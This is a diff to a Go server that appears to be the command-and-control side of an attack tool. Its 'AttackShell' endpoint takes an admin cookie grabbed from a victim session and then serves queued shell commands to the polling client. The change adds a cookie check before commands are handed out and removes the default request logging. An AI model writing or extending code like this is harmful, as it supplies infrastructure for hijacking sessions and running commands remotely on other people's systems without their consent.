@@ -34,11 +34,12 @@ type PendingRequests struct {
 
 var (
 	PendingRequestsMap            = make(map[string]PendingRequests)
+	FlagInTrue                    = make(chan string, 2)
+	command                       = make(chan string, 5)
+	FlagInFalse                   string
+	FlagBool                      bool
 	ObtainingOnlineNumberOfPeople []SessionInfo
 	mu                            sync.Mutex
-	flag                          = make(chan string, 2)
-	command                       = make(chan string, 5)
-	FlagBool                      bool
 )
 
 func ObtainingSession(SessionName string) {
@@ -130,7 +131,7 @@ func (r *RoutingGroup) AttackShell(c *gin.Context) {
 	timeout := time.After(time.Hour * 24)
 	if FlagBool == false {
 		select {
-		case adminCookie := <-flag:
+		case adminCookie := <-FlagInTrue:
 			{
 				_ = findSession(adminCookie)
 				CommandStr := <-command
@@ -142,8 +143,14 @@ func (r *RoutingGroup) AttackShell(c *gin.Context) {
 			}
 		}
 	} else if FlagBool == true {
-		CommandStr := <-command
-		c.String(http.StatusOK, CommandStr)
+		flag2_ := FlagInFalse
+		adminCookies, _ := c.GetRawData()
+		if string(adminCookies) == flag2_ {
+			CommandStr := <-command
+			c.String(http.StatusOK, CommandStr)
+		} else {
+			_ = 0
+		}
 	}
 }
 func Utf8ToGbk(s []byte) string {
@@ -157,7 +164,7 @@ func (r *RoutingGroup) AttackShellInput(c *gin.Context) {
 	fmt.Println(CommandString)
 }
 func ServerInit() {
-	router := gin.Default()
+	router := gin.New()
 	api := router.Group("/api")
 	RoutingGroup := RoutingGroup{}
 	//-----------------------------------------------------------//
